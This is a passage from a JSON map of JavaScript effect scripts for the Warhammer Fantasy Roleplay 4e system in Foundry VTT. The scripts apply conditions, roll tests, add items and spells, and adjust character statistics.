}\n            }\n    }\n})\n\nlet updateObj = this.actor.toObject();\nlet items = []\nfor (let c of choice)\n{\n    let existing \n    if (c.type == \"skill\")\n    {\n        existing = updateObj.items.find(i => i.name == c.name && i.type == c.type)\n        if (existing && c.diff?.system?.advances?.value)\n        {\n            existing.system.advances.value += c.diff.system.advances.value\n        }\n    }\n\n    if (!existing)\n    {\n        let item = await game.wfrp4e.utility.find(c.name, c.type)\n        if (item)\n        {\n            item = item.toObject()\n            equip(item);\n                items.push(foundry.utils.mergeObject(item, (c.diff || {})))\n        }\n        else\n            ui.notifications.warn(`Could not find ${talent}`, {permanent : true})\n    }\n\n}\nawait this.actor.update(updateObj)\nthis.actor.createEmbeddedDocuments(\"Item\", items);\n\nfunction equip(item)\n{\n    if (item.type == \"armour\")\n        item.system.worn.value = true\n    else if (item.type == \"weapon\")\n        item.system.equipped = true\n    else if (item.type == \"trapping\" && item.system.trappingType.value == \"clothingAccessories\")\n        item.system.worn = true\n}","ht7csu1KImHzpzL5":"return args.item?.actor?.type !== \"vehicle\" || args.item?.type !== \"weapon\" || !args.item.name.includes(\"Cannon\");","huJcVpVn6Q7sQkFC":"if (args.actorsystem.details.move.sail.value > 0)\n  args.actor.system.details.move.sail.value -= 1;\n","hwHpIunCq3ifk2QU":"if (args.item.type == \"spell\")\n{\n   let range = parseInt(args.item.Duration)\n   if (Number.isNumeric(range))\n   {\n          args.item.system.duration.value = \"2 * \" + args.item.system.duration.value\n   }\n}","hwOZxgt7e65iWvYz":"let test = await this.actor.setupCharacteristic(\"t\", {skipTargets: true, appendTitle :  ` - ${this.effect.name}`})\nawait test.roll();\nif (test.failed)\n{\n    let damage = this.effect.sourceTest.result.damage\n\n    this.script.scriptMessage(await this.actor.applyBasicDamage(damage, {damageType : game.wfrp4e.config.DAMAGE_TYPE.IGNORE_ALL, suppressMsg : true}))\n}","hxmwtw5zAHyS2upG":"this.script.scriptMessage(await game.wfrp4e.tables.formatChatRoll(\"giftofthebeast\"))","i59IpmZNLJEPWZ3L":"return args.spell","i5AN97A7IOeygEFA":"if (args.applyAP && args.modifiers.ap.metal) \n{\n    args.modifiers.ap.ignored += args.modifiers.ap.metal\n    args.modifiers.other.push({value : args.modifiers.ap.metal, label : this.effect.name, details : \"Add Metal AP to Damage\" })\n    args.modifiers.ap.details.push(\"<strong>\" + this.effect.name + \"</strong>: Ignore Metal (\" + args.modifiers.ap.metal + \")\");\n    args.modifiers.ap.metal = 0\n}","i7xl0jNpLnBT2h2l":"args.actor.characteristics.dex.value = 0","iAo3wxMLA64rsKjj":"this.script.scriptMessage(await game.wfrp4e.tables.formatChatRoll(\"skavenbrew\"))","iBEPQ3NwtI9DfkEy":"let locations = [];\n\nwhile (locations.length < 2)\n{\n    let loc = await game.wfrp4e.tables.rollTable(\"hitloc\", {hideDSN : true})\n    if (!locations.includes(loc.result))\n    {\n        locations.push(loc.result);\n    }\n}\n\nlocationText = locations.map(i => game.wfrp4e.config.locations[i]).join(\", \")\n\nthis.item.updateSource({name : this.item.name += ` (${locationText})`})","iHn3YzvqNfbwzjZz":"let item = await fromUuid(\"Compendium.wfrp4e-core.items.AtpAudHA4ybXVlWM\")\nlet data = item.toObject();\ndata.system.specification.value = this.actor.characteristics.s.bonus\ndata.system.description.value = \"\"\ndata.name = this.effect.name;\nthis.actor.createEmbeddedDocuments(\"Item\", [data], {fromEffect : this.effect.id})","iLpq4yCFN6YACrYA":"if (args.test.result.castOutcome == \"success\")\n{\n    this.script.scriptMessage(await game.wfrp4e.tables.formatChatRoll(\"demonic-mien\"))\n}","iM4B3IZ4VtpZsl09":"args.size = \"sml\"","iM6JLF8jDXMViReZ":"return ![\"Pick Lock\", \"Sleight of Hand\", \"Channelling (Ulgu)\"].includes(args.skill?.name)","iMDZLr7ueJWBnilj":"args.actor.flags.rangedDamageIncrease += 1","iMu8BZ7eHMAbPEO1":"let healed = args.totalWoundLoss\n\nthis.script.scriptMessage(`<b>this.actor.prototypeToken.name</b> healed ${healed} Wounds`);\n\nthis.actor.modifyWounds(healed)","iNAQJa5HyaEckknX":"let test = await this.actor.setupCharacteristic(\"wp\", {skipTargets: true, appendTitle :  ` - ${this.effect.name}`})\nawait test.roll();\n\n\nlet opposedResult = test.opposedMessages[0]?.getOppose()?.resultMessage?.getOpposedTest()?.result\n\nif (opposedResult?.winner == \"attacker\")\n{\n    let spells = this.actor.itemTypes.spell;\n    if (spells.length)\n    {\n        let chosen = spells[Math.floor(CONFIG.Dice.randomUniform() * spells.length)]\n        this.script.scriptMessage(`Loses access to <strong>${chosen.name}</strong>`)\n        chosen.update({name : chosen.name += \" (LOST)\"})\n    }\n}\n\n\n","iO2hCDwyQ7v4qrOI":"if (args.test.options.staunchBleeding) {\n if (args.test.result.roll <= game.settings.get(\"wfrp4e\", \"automaticSuccess\") || args.test.result.roll <= args.test.target) {\n   let staunch =  ~~args.test.result.SL + 1\n   if (args.test.options.fieldDressing && args.test.result.reversed)\n     staunch =  Math.min(1, Number(args.test.result.SL)) + 1\n   args.test.result.other.push(`<b>${this.actor.name}</b> removed <b>${staunch}</b> Bleeding conditions from the patient.`)\n   }\n   else if (this.actor.characteristics.int.bonus + args.test.result.SL < 0)\n      args.test.result.other.push(`The patient contracts a @UUID[Compendium.wfrp4e-core.items.Item.1hQuVFZt9QnnbWzg]{Minor Infection}.`)\n}","iT0h3VZLEBQnn5Bx":"return args.skill?.name != game.i18n.localize(\"NAME.Charm\") && args.skill?.name != game.i18n.localize(\"NAME.Gossip\") && args.skill?.name != game.i18n.localize(\"NAME.ConsumeAlcohol\");","iT3C15fMyQrj1RmG":"if (this.actor.has(\"Undead\") && this.actor.has(\"Ethereal\"))\n{\n    this.actor.setupSkill(game.i18n.localize(\"NAME.Cool\"), {skipTargets: true, appendTitle :  \" - \" + this.effect.name}).then(async test => {\n           await test.roll();\n           if(test.failed)\n               this.actor.addCondition(\"stunned\")\n    })\n}","iVhi3Z6zPaf1bf8g":"return [\"t\", \"i\", \"ag\", \"dex\", \"int\", \"wp\"].includes(args.characteristic)","iX0ctHYHg12pjaCU":"let result = await game.wfrp4e.tables.rollTable(\"gift-of-slaanesh\")\n\nif (result.object.documentId && result.object.documentCollection)\n{\n    let item = await fromUuid(`Compendium.${result.object.documentCollection}.${result.object.documentId}`);\n    if (item)\n    {  \n        let data = item.toObject();\n        // Some items need sourceTest for their effects\n        foundry.utils.setProperty(data, \"flags.wfrp4e.sourceTest\", this.effect.sourceTest);\n        await this.actor.createEmbeddedDocuments(\"Item\", [data], {fromEffect : this.effect.id});\n    }\n}\n\nthis.script.scriptMessage(game.wfrp4e.tables.formatChatRoll(\"gift-of-slaanesh\", {lookup : result.roll, hideDSN: true}));","id9ZdkERMZnZTWXt":"if (args.extendedTest?.getFlag(\"wfrp4e\", \"fear\"))\n{\n\tthis.script.scriptNotification(\"Immune to Fear\");\n\targs.extendedTest.delete();\n\targs.abort = true;\n}\nreturn args.options.terror || args.extendedTest?.getFlag(\"wfrp4e\", \"fear\")","igVAVU7DOuzhNG14":"return args.item?.system.isMelee","imKVsCy8rya2gkwO":"// Any Characteristic penalties due to failed Consume Alcohol Tests\n// or the state of being Stinking Drunk are eliminated. \nawait this.actor.removeSystemEffect(\"consumealcohol1\")\nawait this.actor.removeSystemEffect(\"consumealcohol2\")\nawait this.actor.removeSystemEffect(\"consumealcohol3\")\nawait this.actor.removeSystemEffect(\"stinkingdrunk1\")\n\n// The drinker is thereafter Fatigued \n// for a number of hours equal to 10 minus their Toughness Bonus — \n// nothing but time and rest can eliminate this penalty.\nawait this.actor.addCondition(\"fatigued\")\nconst duration = 10 - parseInt(this.actor.system.characteristics.t.bonus)\nthis.effect.updateSource({\"duration.rounds\" : duration});\nthis.script.scriptMessage(`<p><strong>${this.actor.prototypeToken.name}</strong> has lost all alcohol related penalties and gains the Fatigued Condition for ${duration} hours.</p>`, \n{\n  whisper: ChatMessage.getWhisperRecipients(\"GM\"), \n  blind: true \n})    ","inPxRSx0CDj1nwAm":"if (args.test.result.fumble && !this.actor.itemTypes.talent.find(i => i.name == \"Arcane Magic (Fire)\"))\n{\n    this.actor.addCondition(\"ablaze\");\n}","ioeTj5mx8jlA5EX5":"args.actor.addCondition(\"stunned\")","ipkkRffJh61WE7zR":"if (!args.flags.amputatedFootOrLeg)\n{\n\targs.flags.amputatedFootOrLeg= true;\n\targs.fields.modifier -= 20;\n}","iqUvV1Vu81M3WyZ4":"let SL = Number(this.effect.sourceTest.result.SL);\nfor (let i=0; i<SL; i++) {\n\t\n}","iuSoKntfJ4eAPafQ":"let spells = await game.wfrp4e.utility.findAll(\"spell\", \"Loading Spells\");\nspells = spells.filter(s => [\"fire\", \"heavens\", \"beasts\", \"shadow\", \"light\", \"life\", \"death\", \"metal\"].includes(s.system.lore.value)).sort((a, b) => a.system.lore.value > b.system.lore.value ?  1 : -1)\n\nlet choice = await ItemDialog.create(spells, 1, \"Choose Spell\");\nif (choice[0])\n{\n    this.actor.createEmbeddedDocuments(\"Item\", choice, {fromEffect: this.effect.id})\n}\n","iuYuf05BNuZ5fllI":"if (args.test.isFumble)\n{\n    args.test.result.other.push(\"@Table[poisoned-wind-globe]\")\n}","j1AmrY1SxFJQyapo":"if (this.actor.status.advantage.value > 0 && args.item.system.attackType)\n{\n    args.item.system.qualities.value.push({name : \"penetrating\"})\n}","j3zDMWkns32Yrxn3":"this.effect.updateSource({\"flags.wfrp4e.ward\" :  9})","j6Bf1iivH8cqSnnK":"let target = args.data.targets[0]\nreturn target?.actor.hasCondition(\"prone\") || target.hasCondition(\"surprised\")","j98hvy6r9G2Vjmid":"if (args.totalWoundLoss > 0) \n{\n  args.opposedTest.result.other.push(\n  `@Corruption[minor]{Minor Exposure to Corruption}`\n  )\n  this.script.scriptMessage(\n  `<strong>${this.effect.name}</strong>: \n    @Corruption[minor]{Minor Exposure to Corruption} <br/>\n    <strong>${args.actor.prototypeToken.name}</strong> must take an \n    <strong>Average (+20%) Corruption (Minor) Test</strong>`, \n    {whisper: ChatMessage.getWhisperRecipients(\"GM\")})\n}","jC8o5PbnqEvOoZ9N":"this.actor.addCondition(\"poisoned\", 2)","jFwema0iwzBphxie":"let woundsGained = Math.min(args.actor.status.wounds.value, args.totalWoundLoss)\nwoundsGained = Math.ceil(woundsGained / 2)\n\nargs.attacker.update({\"system.status.wounds.value\" : args.attacker.system.status.wounds.value + woundsGained})\n\nargs.actor.addCondition(\"fatigued\")\nargs.attacker.hasCondition(\"fatigued\")?.delete();\n\nthis.script.scriptMessage(`<b>${args.attacker.prototypeToken.name}</b> gains ${woundsGained} Wounds`);","jGDk7avWFSnyFoql":"let broken = this.actor.hasCondition(\"broken\");\nlet item = await fromUuid(\"Compendium.wfrp4e-core.items.Item.IAWyzDfC286a9MPz\");\n\nif (broken && !broken.getFlag(\"wfrp4e\", \"blasted-mind\") && !this.actor.has(item.name))\n{\n    await broken.delete();\n    this.actor.createEmbeddedDocuments(\"Item\", [item], {fromEffect: this.effect.id})\n    this.script.scriptNotification(`Removed ${broken.name}, added ${item.name} (${Math.ceil(CONFIG.Dice.randomUniform() * 10)} Rounds)`)\n}","jHgxpe6TJDlP3oTn":"let spells = await game.wfrp4e.utility.findAll(\"spell\", \"Loading Spells\");\nspells = spells.filter(s => [\"slaanesh\"].includes(s.system.lore.value))\n\nlet choice = await ItemDialog.create(spells, 1, \"Choose Spell\");\nif (choice[0])\n{\n    this.item.updateSource({name : this.item.name + ` (${choice[0].name})`})\n    this.actor.createEmbeddedDocuments(\"Item\", choice, {fromEffect: this.effect.id})\n}\n","jLsL4KRI6LEG9Ii2":"if (args.test.result.critical && ['rLeg', 'lLeg'].includes(args.test.result.hitloc.result))\n{\n    args.test.result.critModifier = args.test.result.critModifier ? args.test.result.critModifier + 20 : 20\n    args.test.result.critical += ` (+${args.test.result.critModifier})`\n}","jObJanFoev4N6ZRv":"if (!args.opposedTest.attackerTest.item?.system?.isMagical)\n\targs.abort = `<strong>${this.effect.name}</strong>: Ignored`","jOm7RxGFm1y6mCpN":"return args.options.crewTest.name.includes(\"Batten Down\");","jRSgPhpfN7MH7TTp":"if (args.totalWoundLoss > 0)\n{\n    let test = await this.actor.setupSkill(game.i18n.localize(\"NAME.Endurance\"), {skipTargets: true, appendTitle :  ` - ${this.effect.name}`, context: { failure: \"1 Poisoned Condition Gained\", success: \"Resisted Poisoned Condition\" } })\n    await test.roll();\n    if (test.failed)\n    {   \n        args.actor.addCondition(\"poisoned\");\n        if (args.actor.system.status.wounds.value - args.totalWoundLoss <= 0)\n        {\n            args.actor.addCondition(\"unconscious\")\n        }\n    }\n}\n\n    // else\n    //     this.actor.setupCharacteristic(\"t\", { context: { failure: \"1 @Condition[Poisoned] Condition Gained\", success: \"Resisted @Condition[Poisoned] Condition\" } }).then(testCallback)\n","jW87rmQLtROdVEhW":"  if ([\"orc\", \"ork\", \"goblin\", \"hobgoblin\", \"snotling\", \"greenskin\"].includes(args.opposedTest.defender.details.species.value.toLowerCase()))\n    {\n      args.addImpact = true\n      args.opposedTest.result.other.push(\"<b>Rune of Goblin Bane</b>: Impact Added\")\n    }","jWkfoVpHLiRaHTza":"if (args.test.succeeded)\n{\n    args.test.result.other.push(`<strong>${this.effect.name}</strong>: @Terror[1,${this.actor.prototypeToken.name}]`)\n}","jXbrIGxznqf1SNxZ":"const speaker = ChatMessage.getSpeaker({actor: this.actor});\n\nthis.script.scriptMessage(`<p><b>${speaker.alias}</b> is Immersed within a Sea Elemental and suffers from @UUID[Compendium.wfrp4e-core.journals.JournalEntry.NS3YGlJQxwTggjRX.JournalEntryPage.WCivInLZrqEtZzF4#drowning-and-suffocation]{Suffocation}</p><p>They may attempt to escape by freeing themselves from the @Condition[Entangled} Condition as if they were @UUID[Compendium.wfrp4e-core.journals.JournalEntry.NS3YGlJQxwTggjRX.JournalEntryPage.wmA76Q2zJJ9HrkvA#grappling]{Grappled} by the Sea Elemental, making an <b>Opposed Strength Test</b> against its Strength of 59.</p>`);","jYJRO5XPyG7y6fih":"await this.actor.addCondition(\"blinded\")\nawait this.actor.addCondition(\"deafened\")\nawait this.actor.addCondition(\"fatigued\")","jbZPLb4wuqJpHLUx":"this.item.system.flaws.value.push({name : \"dangerous\"})","jdS2u1tQPYeO55WI":"let type = this.item.getFlag(\"wfrp4e\", \"breath\");\n\nif (type == \"cold\")\n{\n\tlet stunned = Math.max(1, Math.trunc(args.totalWoundLoss / 5))\n\tawait args.actor.addCondition(\"stunned\", stunned);\n}\n\nif (type == \"corrosion\")\n{\n    let damageItems = await Dialog.confirm({title : this.item.name, content : `<p>Damage all Items carried?</p>`})\n\tif (damageItems)\n\t{\n\t\tlet msg = ``\n\t\tlet weapons = args.actor.itemTypes.weapon.filter(i => i.isEquipped);\n\t\tlet armour = args.actor.itemTypes.armour.filter(i => i.isEquipped);\n\t\tlet trappings = args.actor.itemTypes.trapping.filter(i => i.isEquipped);\n\t\tfor(let item of weapons)\n\t\t{\n\t\t\tif (item.system.properties.qualities.shield)\n\t\t\t{\n\t\t\t\tawait item.system.damageItem(1, \"shield\");\n\t\t\t}\n\t\t\telse \n\t\t\t{\n\t\t\t\tawait item.system.damageItem(1);\n\t\t\t}\n\t\t\tmsg += `<p><strong>${item.name}</strong> damage by 1</p>`\n\t\t}\n\t\tfor(let item of armour)\n\t\t{\n\t\t\tawait item.system.damageItem(1);\n\t\t\tmsg += `<p><strong>${item.name}</strong> damage by 1</p>`\n\t\t}\n\t\tfor(let item of trappings)\n\t\t{\n\t\t\tawait item.system.damageItem(1);\n\t\t\tmsg += `<p><strong>${item.name}</strong> damage by 1</p>`\n\t\t}\n\t\tif (msg)\n\t\t{\n\t\t\tthis.script.scriptMessage(msg, {speaker : {alias : args.actor.name}});\n\t\t}\n\t}\n}\n\nif (type == \"fire\")\n{\n\tawait args.actor.addCondition(\"ablaze\");\n}\n\nif (type == \"electricity\")\n{\n\tawait args.actor.addCondition(\"stunned\");\n}\n\nif (type == \"poison\")\n{\n\tawait args.actor.addCondition(\"poisoned\");\n}\n\n","jfk5VDKMTIf4ee0v":"if (args.totalWoundLoss > 0)\n    args.actor.addCondition(\"poisoned\")","jgO1Kf60Ctt6R0qO":"return args.item?.name != game.i18n.localize(\"NAME.Leadership\")","jmxlpyLrIuoxQtvU":"    this.actor.getActiveTokens().forEach(t => t.document.update({texture : {scaleX : 2, scaleY: 2, src: \"modules/wfrp4e-core/tokens/popout/gor.webp\"}}));\n","jpcU8FFWSlQ3gD0L":"return !args.skill?.name?.includes(game.i18n.localize(\"NAME.Trade\"))","jrvj7bRyMBB9LixP":"this.actor.addCondition(\"fatigued\", 3)","jsgLEVYvMieyYT6L":"let tokenImg = \"\"; // Put path to token image here, inbetween the quotation marks\nif (tokenImg)\n{\n    if (this.effect.getFlag(\"wfrp4e\", \"transformed\"))\n    {\n        await this.effect.setFlag(\"wfrp4e\", \"transformed\", false);\n        this.actor.getActiveTokens().forEach(t => t.document.update({texture : {src: this.actor.prototypeToken.texture.src}}));   \n    }\n    else \n    {\n        await this.effect.setFlag(\"wfrp4e\", \"transformed\", true);\n        this.actor.getActiveTokens().forEach(t => t.document.update({texture : {src: tokenImg}}));\n    }\n}\nelse \n{\n    this.script.scriptNotification(\"No Token Image path configured. The image path should be set in the first line of this script.\", \"error\");\n}","k0AkkBLtE8oZhBwn":"if (isNaN(parseInt(this.item.system.specification.value))) {\n  let value = await ValueDialog.create(\"Armoured Value\", \"Enter the Armoured value\");\n  if (value) {\n    this.item.updateSource({\"system.specification.value\" : value});\n  }\n}","k3FqFgsF6a3TkxAD":"let test = await this.actor.setupSkill(game.i18n.localize(\"NAME.Cool\"), {skipTargets: true, appendTitle :  ` - ${this.effect.name}`})\ntest.roll();\nreturn true;","k8TC0yzp4xfOXD2n":"if (args.totalWoundLoss > 0)\n{\n    let test = await args.actor.setupSkill(game.i18n.localize(\"NAME.Endurance\"), {skipTargets: true, appendTitle :  ` - ${this.effect.name}`});\n    await test.roll();\n    if (test.failed)\n    {\n\t    args.actor.addCondition(\"stunned\");\n    }\n\targs.actor.hasCondition(\"bleeding\")?.delete()\n}","k9SvH4Lm3ZuI8S1N":"return ![\"wp\", \"ag\", \"i\", \"int\"].includes(args.characteristic)","kBXVEnSWzaQZLkJH":"if(args.test.result.critical)\n{\n   args.test.result.damage +=1 \n   args.test.result.additionalDamage += 1\n}","kIM4Fs1lFVV7TSnj":"this.actor.modifyAdvantage(1);","kMSdRskYDI2J1gnp":"let test = await this.actor.setupSkill(game.i18n.localize(\"NAME.Endurance\"), {fields : {difficulty : \"average\"}, skipTargets: true, appendTitle :  ` - ${this.effect.name}`})\nawait test.roll();  \nif (test.failed)\n{\n    this.actor.addCondition(\"prone\");\n}\n  ","kWynO1lQzjiSs8RK":"return args.skill?.name != game.i18n.localize(\"NAME.Haggle\");","kYiDBPRKIokFkr4Z":"if (args.item.type  == \"skill\" && args.item.name == \"Ranged (Bow)\")\n{\n     args.item.system.modifier.value += 20;\n}","kYmscP2HuXjDovBD":"return args.skill?.name.includes(game.i18n.localize(\"NAME.Stealth\"))\n","kbXDGAmWWD4CZJHB":"const sin = this.effect.sourceActor.system.status.sin.value;\nconst roll = new Roll(`2d10 - ${sin}`);\nawait roll.evaluate();\nawait roll.toMessage({flavor: `${this.effect.name}`});\nthis.actor.system.status.mood.addEntry(`${this.effect.name} (${this.effect.sourceActor.name})`, roll.total);","kiJ6AiaYVUjt6aV6":"teeth = await fromUuid(\"Compendium.wfrp4e-core.items.fBcZhOBn8IpoVqQ1\")\nteeth = teeth.toObject();\n\nlet roll = await new Roll(\"1d10\").roll();\nroll.toMessage(this.script.getChatData({flavor : \"Teeth Lost\"}))\nteeth.system.location.value = `${roll.total} ${teeth.system.location.value}`\nthis.actor.createEmbeddedDocuments(\"Item\", [teeth])","kkC5EhqA05U6U0gU":"let test = await this.actor.setupSkill(game.i18n.localize(\"NAME.Cool\"), {skipTargets: true, appendTitle :  ` - ${this.effect.name}`})\nawait test.roll();\n\n// Kind of insane but whatever\nlet opposedResult = test.opposedMessages[0]?.getOppose()?.resultMessage?.getOpposedTest()?.result\n\nif (opposedResult?.winner == \"attacker\")\n{\n    if (opposedResult.differenceSL < 6)\n    {\n        this.actor.addCondition(\"fatigued\", Math.floor(opposedResult.differenceSL / 2))\n    }\n    else if (opposedResult.differenceSL >= 6)\n    {\n        this.actor.addCondition(\"broken\");\n    }\n}","kmsGLWGxCY8Z8jVG":"return args.skill?.name != game.i18n.localize(\"NAME.Intuition\");","kvaN100w0nBUlLbj":"let poisoned = this.actor.hasCondition(\"poisoned\")\nif (poisoned)\n{\n    this.script.scriptMessage(\"Immune to Poisoned\")\n    poisoned.delete()\n}","kvnZz8yqdTZbErkr":"args.actor.system.details.move.value -= 2;\nargs.actor.system.details.man -= 1;\nargs.actor.system.status.carries.max *= 1.5;","l8qFKSnMpy4P7XQR":"return !args.skill?.name.includes(game.i18n.localize(\"NAME.Stealth\"));","lCOdnKz8XpnkDs6Q":"let test = await this.actor.setupCharacteristic(\"t\", {skipTargets: true, appendTitle :  ` - ${this.effect.name}`})\nawait test.roll();","lFO6XdfUODmFArqx":"args.actor.addCondition(\"bleeding\")","lII4KMRblqwFBlsV":"let characteristics = {\n  \"ws\" : 10,\n  \"bs\" : 0,\n  \"s\" : 0,\n  \"t\" : 0,\n  \"i\" : 10,\n  \"ag\" : 0,\n  \"dex\" : 0,\n  \"int\" : 20,\n  \"wp\" : 10,\n  \"fel\" : 15\n}\nlet skills = [\"Channelling\", \"Charm\", \"Perform (Dancing)\"]\nlet skillAdvancements = [0, 6, 3]\nlet talents = [\"Attractive\", \"Distract\", \"Mimic\"]\nlet traits = [\"Distracting\", \"Flight (6)\", \"Spellcaster (Petty)\"]\nlet trappings = []\nlet items = [];\nlet spells = [\"Marsh Lights\", \"Sleep\"];\n\nlet updateObj = this.actor.toObject();\n\nfor (let ch in characteristics)\n{\n  updateObj.system.characteristics[ch].modifier += characteristics[ch];\n}\n\nfor (let index = 0; index < skills.length; index++)\n{\n  let skill = skills[index]\n  let skillItem;\n  skillItem = updateObj.items.find(i => i.name == skill && i.type == \"skill\")\n  if (skillItem)\n      skillItem.system.advances.value += skillAdvancements[index]\n  else \n  {\n      skillItem = await game.wfrp4e.utility.findSkill(skill)\n      skillItem = skillItem.toObject();\n      skillItem.system.advances.value = skillAdvancements[index];\n      items.push(skillItem);\n  }\n}\n\nfor (let talent of talents)\n{\n  let talentItem = await game.wfrp4e.utility.findTalent(talent)\n  if (talentItem)\n  {\n      items.push(talentItem.toObject());\n  }\n  else \n  {\n      ui.notifications.warn(`Could not find ${talent}`, {permanent : true})\n  }\n}\n\nconst traitRegex = /(?:,?(.+?)(\\+?\\d{1,2}\\+?)?\\s*?(?:\\((.+?)\\)\\s*(\\+?\\d{1,2})?|,|$))/gm\nfor (let trait of traits)\n{\n  let traitMatches = trait.matchAll(traitRegex).next().value\n  let traitName = traitMatches[1]\n  let traitVal = traitMatches[2] || traitMatches[4] // could be match 2 or 4 depending on if there's a specialization\n  let traitSpec = traitMatches[3]\n\n  let traitItem;\n  try {\n      traitItem = await WFRP_Utility.findItem(traitName, \"trait\")\n  }\n  catch { }\n  if (!traitItem) {\n      ui.notifications.warn(`Could not find ${trait}`, {permanent : true})\n  }\n  traitItem = traitItem.toObject()\n\n  if (Number.isNumeric(traitVal))\n  {\n      traitItem.system.specification.value = traitName.includes('Weapon','Horns','Tail','Tentacles','Bite') ? traitVal - parseInt(characteristicValues[3]/10) : traitVal;\n      traitItem.name = (traitItem.name +  ` ${traitSpec ? \"(\"+ traitSpec + \")\" : \"\"}`).trim()\n  }\n  else \n      traitItem.system.specification.value = traitSpec\n\n  items.push(traitItem)\n\n}\n\nfor (let trapping of trappings) \n{\n  let trappingItem = await game.wfrp4e.utility.findItem(trapping)\n  if (trappingItem)\n  {\n      trappingItem = trappingItem.toObject()\n\n      equip(trappingItem)\n\n      items.push(trappingItem);\n  }\n  else \n  {\n      ui.notifications.warn(`Could not find ${trapping}`, {permanent : true})\n  }\n}\n\nfor (let spell of spells) \n{\n  let spellItem = await game.wfrp4e.utility.findItem(spell)\n  if (spellItem)\n  {\n      spellItem = spellItem.toObject()\n\n      items.push(spellItem);\n  }\n  else \n  {\n      ui.notifications.warn(`Could not find ${spell}`, {permanent : true})\n  }\n}\n\nupdateObj.name = updateObj.name += \" \" + this.effect.name\n\nawait this.actor.update(updateObj)\nthis.actor.createEmbeddedDocuments(\"Item\", items);\n\n\nfunction equip(item)\n{\n  if (item.type == \"armour\")\n      item.worn = true\n  else if (item.type == \"weapon\")\n      item.equipped = true\n  else if (item.type == \"trapping\" && item.trappingType?.value == \"clothingAccessories\")\n      item.worn = true\n}","lOIHiAIDtj91kllN":"const chanties = await WFRP_Utility.findAll('wfrp4e-soc.chanty');\nlet choice = await ItemDialog.create(chanties, 1, \"Choose Chanty\");\nif (choice.length) {\n  console.log(choice);\n  this.actor.createEmbeddedDocuments(\"Item\", choice, {fromEffect: this.effect.id});\n}","lOzkngzye4RmvALp":"let item = await fromUuid(\"Compendium.wfrp4e-core.items.DrNUTPeodEgpWTnT\")\nthis.actor.createEmbeddedDocuments(\"Item\", [item], {fromEffect : this.effect.id});\nthis.script.scriptNotification(\"Added \" + item.name)","lPudo1grrVp05i7a":"let loc = Math.floor(CONFIG.Dice.randomUniform() * 2) == 0 ? \"head\" : \"body\"\nlet damage = this.actor.system.characteristics.s.bonus + 6\n\n    this.actor.setupSkill(game.i18n.localize(\"NAME.Cool\"), {skipTargets: true, appendTitle :  \" - \" + this.effect.name}).then(async test => {\n           await test.roll();\n           if(test.failed)\n           {\n               await this.actor.addCondition(\"stunned\")\n               this.script.scriptMessage(await this.actor.applyBasicDamage(damage, {loc, damageType : game.wfrp4e.config.DAMAGE_TYPE.IGNORE_AP, suppressMsg: true}))\n           }\n    })","lQJ68n3y1xDyNicE":"return !args.options.sizeModifier && args.item?.system?.attackType != \"ranged\"","lSOAZ4FG44bT4jh1":"let infected = await fromUuid(\"Compendium.wfrp4e-core.items.V0c3qBU1CMm8bmsW\")\nlet fear = await fromUuid(\"Compendium.wfrp4e-core.items.pTorrE0l3VybAbtn\")\n\nlet infectedData = infected.toObject();\nlet fearData = fear.toObject();\nfearData.system.specification.value = 2;\nthis.actor.createEmbeddedDocuments(\"Item\", [fearData, infectedData], {fromEffect : this.effect.id})","lU4s3UTtBkU38djI":"this.actor.addCondition(\"entangled\")\nlet msg = `<b>${this.actor.prototypeToken.name}</b> loses 1 Wound and gains 1 <strong>Entangled</strong> Condition.`\nthis.script.scriptMessage(msg)\nthis.actor.modifyWounds(-1)","lYYkGzqNshiYc7WI":"let test = await this.actor.setupSkill(game.i18n.localize(\"NAME.Endurance\"), {skipTargets: true, appendTitle :  ` - ${this.effect.name}`})\nawait test.roll();\nif (test.failed)\n{\n    this.actor.addCondition(\"poisoned\")\n}","lZuavewrJzOehrJQ":"let test = await this.actor.setupSkill('Endurance',  {\n  appendTitle: ` – ${this.effect.name}`,\n  skipTargets: true,\n  fields: {difficulty: 'easy'},\n  characteristic: 't',\n  context: {failure: \"Mast shattered!\"}\n});\nawait test.roll();\n\nif (test.failed) {\n  let crit = await fromUuid(\"Item.d4bCnR1zINTNF9VC\");\n  await this.actor.createEmbeddedDocuments(\"Item\", [crit]);\n  this.effect.update({disabled: true});\n}","laptAldsT0Fm1rDt":"let blunt = await Dialog.confirm({label : \"test\", content :`<p>Apply blunt damage reduction? (-3)</p>`})\n\nif (blunt)\n{\n    args.modifiers.other.push({label : this.effect.name, details : \"Blunt Damage Reduction\", value : -3})\n}","lhemR8EP5tGNKout":"let test = await this.actor.setupSkill(game.i18n.localize(\"NAME.Cool\"), {fields: {difficulty : \"average\"}, skipTargets: true, appendTitle :  ` - ${this.effect.name}`, context : {failure : \"Suffer Creeping Irrationality\"}})\nawait test.roll();\nif (test.failed)\n{\n    msg = `<p>@UUID[${this.effect.sourceItem.uuid}]{Creeping Irratitonality} Roll: <a class=\"inline-roll\"><i class=\"fas fa-dice-d20\"></i>${Math.ceil(CONFIG.Dice.randomUniform() * 10)}</a></p>`\n    if (test.result.roll % 11 == 0 || test.result.roll == 100)\n    {\n        msg += `<p><b>${this.actor.prototypeToken.name}</b> also gained 1 Corruption Point. If mutating, this results in a @Table[mutatemental]{Mental Corruption}</p>`\n        let newCorruption = Number(this.actor.status.corruption.value) + 1\n        this.actor.update({\"system.status.corruption.value\" : newCorruption})\n    }\n\n    this.script.scriptMessage(msg);\n}\n","ljGX2w8hCTyLAjRp":"let specification = Number(this.item.specification.value) || 1;\nargs.actor.system.details.price.gc -= Math.floor(args.actor.system.details.price.gc * 0.1 * specification);","ljpM7muMyxGD04EX":"let item = await fromUuid(\"Compendium.wfrp4e-core.items.MVI0lXcg6vvtooAF\")\nlet data = item.toObject();\nthis.actor.createEmbeddedDocuments(\"Item\", [data], {fromEffect : this.effect.id})","lol5J6h0pErzM71s":"return args.weapon?.system.properties.flaws.crewed","lvjcddwRiN9iGruy":"let test = await this.actor.setupCharacteristic(\"t\", { appendTitle: ` - ${this.effect.name}`, fields: { difficulty: \"challenging\" } })\nawait test.roll();\n\nif (test.failed) \n{\n    let ageAdded = Math.ceil(CONFIG.Dice.randomUniform() * 10) + Math.ceil(CONFIG.Dice.randomUniform() * 10)\n    let ws = Math.ceil(CONFIG.Dice.randomUniform() * 10)\n    let bs = Math.ceil(CONFIG.Dice.randomUniform() * 10)\n    let s = Math.ceil(CONFIG.Dice.randomUniform() * 10)\n    let t = Math.ceil(CONFIG.Dice.randomUniform() * 10)\n    let ag = Math.ceil(CONFIG.Dice.randomUniform() * 10)\n    let dex = 